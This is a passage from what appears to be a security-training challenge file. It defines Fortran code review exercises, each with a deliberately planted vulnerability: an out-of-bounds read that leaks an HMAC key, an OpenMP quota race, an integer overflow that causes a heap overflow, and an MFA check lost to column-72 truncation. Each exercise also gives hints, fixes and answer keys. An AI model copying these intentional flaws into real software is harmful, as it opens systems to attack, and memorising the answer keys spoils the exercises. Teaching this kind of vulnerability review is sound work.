  allocate(results(4096))
  results = 0.0_dp
  nresults = 0
  book%discount = 0.97_dp
  book%hmac_key = 1.0_dp
  book%rng_seed = 42

  req%scenario_id = 12
  req%book_id = 1
  req%notional = 1.0e6_dp

  call run_pricing_request(book, req, results, nresults, ok)
  print *, "priced=", ok, " count=", nresults, " pv=", results(req%scenario_id)
end program driver`,
		targetVuln: `The worker trusts req%scenario_id end to end without ever validating that it
falls inside the valid range 1..max_scenarios. The integer arrives over the
wire from the front end, which exposes it to the caller as an "opaque path
counter", so it is fully attacker-controlled.

Two array accesses use it raw:

1. The read. scenario_pv does df = discounts(scenario_id) with no range check.
Because the discount array is declared discount(max_scenarios) as the first
component of book_state_t, immediately followed by hmac_key(8) and rng_seed,
an index of 4097..4104 reads straight through the end of discount and lands
inside the HMAC signing key (and beyond). The computed pv = notional * df * n is
returned to the caller, so the attacker recovers the raw key material 8 bytes
at a time by sweeping scenario_id and dividing out the known notional and n.
(Empirically confirmed: scenario_pv(book%discount, 4096, 4097, 1.0) returns
exactly hmac_key(1)*n.) With the books of different tenants laid out adjacently,
larger indices disclose a neighbouring tenant's discount curve as well.

2. The write. run_pricing_request then does slot = req%scenario_id followed by
results(slot) = pv, again unchecked. results is the shared batch buffer; an
out-of-range slot writes the attacker-influenced pv past its end, corrupting
whatever the linker/allocator placed next (the collector's count, another
tenant's slot, or a control variable), turning the disclosure primitive into
a memory-corruption / integrity primitive.

The reason this is Fortran-specific and invisible in production: Fortran does
NOT bounds-check array subscripts by default. Checking only happens when the
program is compiled with -fcheck=bounds (gfortran) or -CB / -check bounds
(ifort), which is a debug-only flag. The shipping build is optimized with no
such flag, so discounts(4097) and results(4097) are pure pointer arithmetic
(base + (index-1)*stride) with no trap — the program returns the leaked value
and exits 0. The QA debug build, compiled with -fcheck=bounds, aborts at the
read line with "Index 4097 ... above upper bound of 4096", so the flaw never
reproduces where anyone is looking for it.`,
		conceptualFix: `Validate the index against the array's real extent before ever subscripting
with it, and never rely on the compiler to do it for you in release builds.

Reject the request the moment a bad id is seen, e.g. at the top of
run_pricing_request:

  if (req%scenario_id < 1 .or. req%scenario_id > max_scenarios) then
    ok = .false.
    return
  end if

and apply the same guard to the results buffer using its actual size,
size(results), rather than assuming it matches max_scenarios:

  slot = req%scenario_id
  if (slot < 1 .or. slot > size(results)) then
    ok = .false.
    return
  end if
  results(slot) = pv

Make scenario_pv defensive too: it should derive its upper bound from
size(discounts) and bounds-check scenario_id itself rather than trusting the
caller-supplied n, so the function is safe regardless of who calls it.

Defence in depth: do not co-locate secret material (hmac_key) in the same
derived type as a user-indexable buffer; keep keys in separately allocated,
non-adjacent storage. And enable -fcheck=bounds (or -check bounds) in CI and,
where the performance budget allows, in production for this untrusted-input
path, so an off-by-one is a hard failure instead of a silent leak.`,
		hints: []string{
			"The scenario id is described as an opaque counter that the caller picks. Trace exactly where that integer flows, and notice everything the code does to it between arriving in the request and being used as a subscript.",
			"Look at how book_state_t is laid out in memory: what sits in the bytes immediately after the discount array, and what would an index of 4097 actually touch? Then ask the same question about the results buffer for an out-of-range write.",
			"Fortran performs no subscript range checking unless you compile with a specific debug flag (gfortran's -fcheck=bounds, ifort's -CB). Consider how the production build differs from the QA build, and why the same input behaves differently in each.",
		},
		vulnerableLines: []int{36, 59},
	}
}

// ──────────────────────────────────────────────────
// The Overspent Cluster — Quota Bypass in a Parallel Admission Gateway
// Difficulty 7 — race-condition
// ──────────────────────────────────────────────────
func fortranOpenmpQuotaRace() challengeSeed {
	return challengeSeed{
		title:        "The Overspent Cluster — Quota Bypass in a Parallel Admission Gateway",
		slug:         "fortran-openmp-quota-race",
		difficulty:   7,
		langSlug:     "fortran",
		catSlug:      "race-condition",
		points:       450,
		cveReference: "CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition",
		description:  `You are auditing the admission controller for a national HPC center's compute gateway. Every night a scheduler hands the gateway a batch of up to several thousand queued jobs, and the gateway must admit only as many as fit under a hard cluster-wide budget of node-hours — an SLA limit that, if exceeded, triggers expensive cloud burst billing and contractual penalties. To keep nightly turnaround under a minute, the team parallelized the admission loop across the worker pool with OpenMP, so dozens of threads evaluate jobs concurrently. Finance has reported that on busy nights the cluster repeatedly overspends its node-hour budget by a few percent, even though the code clearly refuses any job once the budget would be exceeded and the per-job cost accounting looks correct. The single-threaded unit tests pass perfectly and the logic reads as obviously right. Your task: review module compute_gateway, find the one defect that lets the hard cap be exceeded under load, explain the precise Fortran/OpenMP mechanism that causes it, and describe the fix. Assume the build always uses -fopenmp and a multi-thread runtime.`,
		code: `module compute_gateway
  use, intrinsic :: iso_fortran_env, only: int64, real64
  implicit none
  private
  public :: gateway_init, dispatch_batch, admitted_count, rejected_count

  ! Cluster-wide budget shared across every worker thread in the pool.
  ! One node-hour is debited per admitted job; the cap is a hard SLA limit.
  integer(int64), save :: remaining_node_hours = 0_int64
  integer(int64), save :: admitted = 0_int64
  integer(int64), save :: rejected = 0_int64

contains

  subroutine gateway_init(total_node_hours)
    integer(int64), intent(in) :: total_node_hours
    remaining_node_hours = total_node_hours
    admitted = 0_int64
    rejected = 0_int64
  end subroutine gateway_init

  pure function job_cost(priority, ranks) result(cost)
    integer, intent(in) :: priority
    integer, intent(in) :: ranks
    integer(int64)      :: cost
    ! Higher priority jobs reserve more headroom; cost is in node-hours.
    cost = int(max(1, ranks), int64) * int(1 + (5 - min(priority, 5)), int64)
  end function job_cost

  subroutine dispatch_batch(priorities, ranks, granted)
    integer, intent(in)  :: priorities(:)
    integer, intent(in)  :: ranks(:)
    logical, intent(out) :: granted(:)
    integer              :: i, n
    integer(int64)       :: cost

    n = size(priorities)
    granted = .false.

    !$omp parallel do default(shared) private(i, cost) schedule(dynamic, 8)
    do i = 1, n
      cost = job_cost(priorities(i), ranks(i))
      if (remaining_node_hours >= cost) then
        remaining_node_hours = remaining_node_hours - cost
        granted(i) = .true.
        admitted = admitted + 1_int64
      else
        rejected = rejected + 1_int64
      end if
    end do
    !$omp end parallel do
  end subroutine dispatch_batch

  function admitted_count() result(c)
    integer(int64) :: c
    c = admitted
  end function admitted_count

  function rejected_count() result(c)
    integer(int64) :: c
    c = rejected
  end function rejected_count

end module compute_gateway

program gateway_driver
  use, intrinsic :: iso_fortran_env, only: int64
  use compute_gateway
  implicit none
  integer, parameter :: njobs = 2048
  integer            :: prio(njobs), ranks(njobs), k
  logical            :: granted(njobs)

  do k = 1, njobs
    prio(k)  = 1 + mod(k, 5)
    ranks(k) = 1 + mod(k, 4)
  end do

  call gateway_init(4000_int64)
  call dispatch_batch(prio, ranks, granted)

  print '(a,i0)', 'admitted = ', admitted_count()
  print '(a,i0)', 'rejected = ', rejected_count()
end program gateway_driver`,
		targetVuln:    `The defect is an unsynchronized read-compare-modify-write (TOCTOU) on the shared module SAVE variable remaining_node_hours inside the !$omp parallel do region. remaining_node_hours is a module-level variable with the SAVE attribute, and default(shared) governs the parallel region, so every thread sees the very same storage cell; only i and cost are private. Each loop iteration performs three logically dependent operations on that shared cell: it READS remaining_node_hours and compares it to cost (the check line, if remaining_node_hours >= cost), and then, if admitted, it WRITES remaining_node_hours = remaining_node_hours - cost (the decrement line). None of this is protected by !$omp atomic, !$omp critical, or a reduction clause, and there is no memory ordering. The decrement is not atomic: at the machine level it is a load, a subtract, and a store. When several threads run concurrently they can each read the same remaining_node_hours, all observe it is >= their respective cost, and all pass the guard; they then each compute new = old - cost from the SAME stale old and store back, so the last store wins and the intervening decrements are lost (lost-update). The net effect is that far more node-hours are granted than were ever debited: the hard SLA cap is silently exceeded. This was empirically confirmed — with a binding budget of 4000 node-hours, a single thread spends exactly 4000 (cap honored, 1514 jobs rejected), while 8 threads overspend to between 7960 and 15362 node-hours, up to roughly 4x the cap. The check is also stale: a thread may pass the guard against a budget another thread is about to (or already did) consume. The window is widened by schedule(dynamic, 8), which keeps many threads contending on the counter. The same lost-update flaw corrupts the admitted/rejected tallies, but the security-relevant impact is the quota/budget bypass: a heavily loaded night or an attacker can drive admissions past the cap, causing overspend and burst-billing. The bug is invisible in single-threaded unit tests because with one thread the read, compare, and write are never interleaved, so the cap is honored exactly. The budget here is deliberately set below total demand (total demand is 15362) so the cap actually binds and the overspend is observable.`,
		conceptualFix: `Make the read-compare-decrement on the shared budget a single indivisible transaction so no two threads can both pass the guard against the same value. The simplest correct fix is to wrap the entire check-and-debit in an OpenMP critical section so the test and the update are atomic with respect to all threads: surround the guard and the decrement with !$omp critical (gateway_budget) ... !$omp end critical, deciding granted(i) inside the region. Equivalently, capture-and-test atomically: use !$omp atomic capture to read-and-decrement remaining_node_hours in one step (capturing the prior value), then decide admission from the captured prior value and, if the job must be rejected, add the cost back inside the same atomic/critical so the counter is never left over-debited. A pure !$omp atomic update on the decrement alone is NOT sufficient, because it does not make the preceding comparison part of the same atomic transaction — the time-of-check to time-of-use gap remains; the check and the update must be one critical region (or a single atomic-capture plus compensating add-back). The accounting counters admitted and rejected should use reduction(+:admitted,rejected) on the parallel do or be updated under the same critical region. For a hot counter under heavy contention a better design is per-thread tentative reservations reconciled under a single lock, or a lock-free compare-and-swap loop, but the minimal correct change is to serialize the test-and-debit of remaining_node_hours.`,
		hints: []string{
			"The unit tests run with a single thread and pass; finance only sees overspend on busy nights when the worker pool is saturated. Ask what property holds with one thread but breaks with many, and which piece of state every thread is looking at simultaneously.",
			"Find the state that is not private to a loop iteration. It lives at module scope with the SAVE attribute, and default(shared) puts it in shared memory. Trace every read and every write of that one cell inside the parallel loop and notice they are three separate machine operations with nothing serializing them.",
			"Two threads can both evaluate the budget guard as true against the same value, then both subtract their cost from that same stale value and store back, so one subtraction is lost and the cap is breached. The test and the debit must be one indivisible operation; a bare atomic on only the subtraction still leaves the gap between the comparison and the update.",
		},
		vulnerableLines: []int{43, 44},
	}
}

// ──────────────────────────────────────────────────
// The Silent Wrap — When a Grid Outgrows a 32-Bit Multiply
// Difficulty 7 — memory-corruption
// ──────────────────────────────────────────────────
func fortranIntegerOverflowAllocate() challengeSeed {
	return challengeSeed{
		title:        "The Silent Wrap — When a Grid Outgrows a 32-Bit Multiply",
		slug:         "fortran-integer-overflow-allocate",
		difficulty:   7,
		langSlug:     "fortran",
		catSlug:      "memory-corruption",
		points:       450,
		cveReference: "CWE-190: Integer Overflow or Wraparound (leading to CWE-787 Out-of-bounds Write)",
		description: `You are auditing the mesh-allocation core of a structured-grid PDE solver used by a
computational-electromagnetics group. The module sizes a scalar field over a regular
nx-by-ny-by-nz lattice, allocates a flat heap buffer for it, and later deposits source
terms cell-by-cell. On small desktop meshes everyone has run for years it behaves
perfectly. The team is now scaling to fine production grids — think 1300 cells per side,
or 2048 x 2048 x 600 — driven straight from a job-submission YAML that any user can edit.
QA reports sporadic crashes, silent result corruption, and one node that got rooted after
a crafted job file. Two functions are in scope: build_field, which computes the element
count and allocates, and deposit_sources, which fills the field. The arithmetic looks
textbook-correct. Find the single defect that turns an oversized-but-legitimate grid
request into a heap overflow, explain the exact language mechanism that lets it pass
silently, and state the fix.`,
		code: `module mesh_allocator
  use, intrinsic :: iso_fortran_env, only: real64, int32, error_unit
  implicit none
  private

  public :: mesh_field, build_field, deposit_sources

  type :: mesh_field
     integer :: nx = 0, ny = 0, nz = 0
     integer :: ncells = 0
     real(real64), allocatable :: phi(:)
  end type mesh_field

contains

  ! Allocate a flat scalar field for a regular nx*ny*nz lattice.
  ! Dimensions arrive from the job description and are validated to be positive.
  subroutine build_field(fld, nx, ny, nz, ok)
    type(mesh_field), intent(out) :: fld
    integer, intent(in) :: nx, ny, nz
    logical, intent(out) :: ok
    integer :: ncells
    integer :: ierr

    ok = .false.
    if (nx < 1 .or. ny < 1 .or. nz < 1) return

    ncells = nx * ny * nz
    fld%nx = nx
    fld%ny = ny
    fld%nz = nz
    fld%ncells = ncells

    allocate(fld%phi(ncells), stat=ierr)
    if (ierr /= 0) then
       write(error_unit, '(a)') 'mesh: field allocation failed'
       return
    end if

    fld%phi = 0.0_real64
    ok = .true.
  end subroutine build_field

  ! Deposit an analytic source term into every cell of the lattice.
  ! The triple loop walks the true geometric extents of the mesh.
  subroutine deposit_sources(fld, amplitude)
    type(mesh_field), intent(inout) :: fld
    real(real64), intent(in) :: amplitude
    integer(int32) :: i, j, k
    integer(int32) :: idx

    do k = 1, fld%nz
       do j = 1, fld%ny
          do i = 1, fld%nx
             idx = (k - 1) * fld%ny * fld%nx + (j - 1) * fld%nx + i
             fld%phi(idx) = amplitude * real(i + j + k, real64)
          end do
       end do
    end do
  end subroutine deposit_sources

end module mesh_allocator`,
		targetVuln:    `The element count ncells = nx * ny * nz is computed entirely in default INTEGER, which is 32-bit (int32) on every mainstream Fortran target. The positivity guard only checks each dimension individually, so a legitimate, attacker-supplied grid such as 1300 x 1300 x 1300 passes validation, yet its true product is 2,197,000,000 -- larger than the signed 32-bit maximum of 2,147,483,647. Fortran default integers wrap silently on overflow; the standard provides no trap and gfortran does not emit one at default optimization, so the multiply produces a wrapped value (here -2,097,967,296) with no error. That wrapped count flows directly into allocate(fld%phi(ncells)). A negative or zero extent makes allocate succeed with a zero-length array (allocation does not fail, stat=0), so build_field returns ok = .true. and ncells is even cached in the type as a bogus field. The damage lands in deposit_sources: its triple loop is bounded by the genuine extents fld%nx, fld%ny, fld%nz, so idx ranges across the real geometric span up to nx*ny*nz, and the line fld%phi(idx) = ... writes element after element -- starting from the very first iteration -- far past the empty (or tiny) heap buffer. That is a classic out-of-bounds heap write driven entirely by untrusted dimensions. Because the loop overruns a heap allocation with attacker-influenced length and values, it corrupts adjacent allocator metadata and neighboring objects, enabling crashes, silent numerical corruption, and -- with a carefully chosen geometry that controls the wrapped size and the overrun footprint -- heap-metadata corruption that can escalate to code execution. An additional latent defect compounds it: idx in deposit_sources is int32 too, so on large grids the index expression itself can wrap, but the primary, always-present flaw is the 32-bit size product feeding allocate.`,
		conceptualFix: `Compute the element count in a 64-bit integer kind and never let a default-integer product reach allocate. Bring in int64 from iso_fortran_env (or use selected_int_kind(18)) and form the product with explicit conversions so the multiplication itself happens in 64-bit: ncells = int(nx, int64) * int(ny, int64) * int(nz, int64). Declare the stored count and the loop index idx as integer(int64) as well, so neither the size nor the addressing arithmetic can wrap. Then bound-check the result before allocating: reject the request if the product is non-positive or exceeds a configured maximum number of cells (and, ideally, verify ncells * storage_size does not exceed available memory), returning ok = .false. instead of proceeding. Keeping the allocation extent, the cached ncells, and the deposit index all in int64, plus an explicit upper-bound check, removes both the silent 32-bit wrap at the size computation and the index wrap in the fill loop, so an oversized grid is refused cleanly rather than under-allocated and overrun.`,
		hints: []string{
			"Re-read build_field with one question in mind: in what integer kind is the cell count actually evaluated, and what does the language do when that arithmetic exceeds its representable range? The per-dimension positivity check is not the whole story.",
			"Hand-evaluate the size expression for a grid like 1300 x 1300 x 1300. Compare the value that reaches allocate against the value the deposit loop's bounds imply. They are not the same number, and Fortran will not warn you.",
			"The allocate succeeds even though the count is wrong, so build_field reports success. Now look at what bounds the writes in deposit_sources versus how many elements were really reserved on the heap -- that mismatch is the overflow.",
		},
		vulnerableLines: []int{28, 34, 56},
	}
}

// ──────────────────────────────────────────────────
// The Seventy-Third Column — A Vanishing MFA Check in Legacy F77
// Difficulty 6 — logic-flaw
// ──────────────────────────────────────────────────
func fortranFixedFormColumnTruncationBypass() challengeSeed {
	return challengeSeed{
		title:        "The Seventy-Third Column — A Vanishing MFA Check in Legacy F77",
		slug:         "fortran-fixed-form-column-truncation-bypass",
		difficulty:   6,
		langSlug:     "fortran",
		catSlug:      "logic-flaw",
		points:       400,
		cveReference: "CWE-1078: Source-formatting flaw -> CWE-863 (fixed-form column-72 truncation)",
		description: `You are auditing SETTLE, the overnight batch that releases matched FX trades to the
clearing house at a mid-sized bank. The module is decades old, still compiled as
fixed-form F77, and gates every release through AUTHRZ. Per the control narrative,
a trade may be released ONLY when the operator holds the admin role, is on the
correct desk, the notional is under the per-desk ceiling, AND a multi-factor step-up
challenge has been passed (MFAOK equal to 1). Compliance signed off on the source
because, reading top to bottom, the compound IF clearly demands all four controls.
Yet penetration testers found that an admin on the right desk, under the ceiling,
who NEVER completed the step-up challenge, still gets trades released to clearing.
The source text looks correct. The compiled behavior is not. Your mission: find the
single line responsible, explain the exact Fortran mechanism that makes the binary
disagree with the source, and prescribe the fix. Counting matters here.`,
		code: `C=======================================================================
C  MODULE: SETTLE  --  trade settlement authorization gate (legacy F77)
C  Part of the overnight batch that releases matched FX trades to the
C  clearing house.  Maintained since the 1990s; still compiled fixed
C  form.  GRANT must require admin role, a desk match, an amount under
C  the per-desk ceiling, AND a passed multi-factor step-up (MFAOK).
C=======================================================================
      SUBROUTINE AUTHRZ(ROLE, DESK, AMOUNT, CEIL, MFAOK, GRANT)
      IMPLICIT NONE
      INTEGER ROLE, DESK, MFAOK
      DOUBLE PRECISION AMOUNT, CEIL
      LOGICAL GRANT
      INTEGER IADMIN
      PARAMETER (IADMIN = 4)
C
C     Release the trade only when every control passes.  The step-up
C     factor (MFAOK) is mandatory for any release above zero notional.
C
      IF (ROLE .EQ. IADMIN .AND. AMOUNT .LE. CEIL .AND. DESK .EQ. 7     .AND. MFAOK .EQ. 1
     &    ) THEN
         GRANT = .TRUE.
      ELSE
         GRANT = .FALSE.
      END IF
      RETURN
      END
C=======================================================================
C  Driver: simulate a release request that has NOT cleared step-up MFA.
C=======================================================================
      PROGRAM CLEAR
      IMPLICIT NONE
      INTEGER ROLE, DESK, MFAOK
      DOUBLE PRECISION AMOUNT, CEIL
      LOGICAL GRANT
C     An operator with admin role on desk 7, under ceiling, but who has
C     NOT completed the multi-factor step-up challenge (MFAOK = 0).
      ROLE   = 4
      DESK   = 7
      MFAOK  = 0
      AMOUNT = 250000.0D0
      CEIL   = 500000.0D0
      CALL AUTHRZ(ROLE, DESK, AMOUNT, CEIL, MFAOK, GRANT)
      IF (GRANT) THEN
         WRITE(*,*) 'TRADE RELEASED TO CLEARING'
      ELSE
         WRITE(*,*) 'RELEASE DENIED - STEP-UP REQUIRED'
      END IF
      END`,
		targetVuln: `The authorization decision in AUTHRZ is the compound IF that ANDs four controls:
admin role, amount under ceiling, desk match, and the multi-factor step-up flag
MFAOK .EQ. 1. The source reads as a four-way conjunction, so a human reviewer
concludes that a release is impossible without MFAOK equal to 1.

The flaw is purely a fixed-form source-layout artifact. In fixed-form Fortran the
compiler only reads columns 1 through 72; any characters in column 73 and beyond are
SILENTLY DISCARDED before parsing (this is the legacy card-image rule, not an error
by default). On the IF line, the clause DESK .EQ. 7 ends at column 67 and columns 68
through 72 are blanks. The final clause .AND. MFAOK .EQ. 1 begins at column 73 and
therefore never reaches the parser. After truncation the surviving statement is
IF (ROLE .EQ. IADMIN .AND. AMOUNT .LE. CEIL .AND. DESK .EQ. 7, which is completed by
the continuation line that supplies the closing parenthesis and THEN. The effective
predicate the binary evaluates is only ROLE .EQ. IADMIN .AND. AMOUNT .LE. CEIL .AND.
DESK .EQ. 7 — three controls, not four. The mandatory MFA step-up check is gone.

Exploitation needs no crafted input: any admin (ROLE 4) on desk 7 with notional at or
below the ceiling is granted release even with MFAOK = 0, fully bypassing the
multi-factor step-up. The driver demonstrates this exactly — it sets MFAOK = 0 and the
program still prints TRADE RELEASED TO CLEARING. The bug is invisible in a normal
code read because the dropped clause is plainly present in the file; it only manifests
when you count columns or inspect the generated code. It also survives ordinary builds
silently: classic F77 compilers and default-flag modern compilers (verified with
gfortran under both default and -std=legacy flags) do not error on the overrun, and the
truncation leaves a syntactically complete, type-correct statement, so nothing flags it.`,
		conceptualFix: `Never let a statement — least of all a security predicate — extend past column 72 in
fixed form. Split the compound condition across explicit continuation lines so every
clause lives within columns 7 to 72, with the continuation character in column 6, for
example:
      IF (ROLE .EQ. IADMIN .AND.
     &    AMOUNT .LE. CEIL  .AND.
     &    DESK .EQ. 7       .AND.
     &    MFAOK .EQ. 1) THEN
Each operand is now unambiguously inside the readable region and none can be silently
dropped. Defensively, treat the access decision as fail-closed: compute the result into
a single LOGICAL and require it to be explicitly TRUE, and consider asserting MFAOK as
a separate guarded statement so a layout slip cannot remove it. Finally, harden the
toolchain so this class of defect cannot recur silently: compile with line-length and
truncation diagnostics promoted to errors (for gfortran, -ffixed-line-length-72 with
-Werror=line-truncation; legacy vendors offer equivalent strict-column flags), or
migrate the module to free-form source where the 72-column rule does not apply. A CI
lint that rejects any fixed-form line exceeding 72 columns closes the gap permanently.`,
		hints: []string{
			"Read the control narrative, then run the driver in your head: the operator has MFAOK = 0, yet the trade is released. The source clearly tests MFAOK .EQ. 1. So the binary is not evaluating the predicate you are reading — ask what the compiler actually saw, not what the file contains.",
			"This is fixed-form F77. The position of a character on a line is not cosmetic here; certain columns have hard meaning to the compiler, and there is a column past which text simply ceases to exist as far as parsing is concerned. Put a ruler on the authorization statement.",
			"Count to column 72 on the IF line. The clause DESK .EQ. 7 ends at column 67 with blanks to 72; everything from column 73 onward — exactly where .AND. MFAOK .EQ. 1 lives — is discarded before parsing. Confirm the truncated statement still compiles because the continuation line closes the parenthesis.",
		},
		vulnerableLines: []int{19},
	}
}
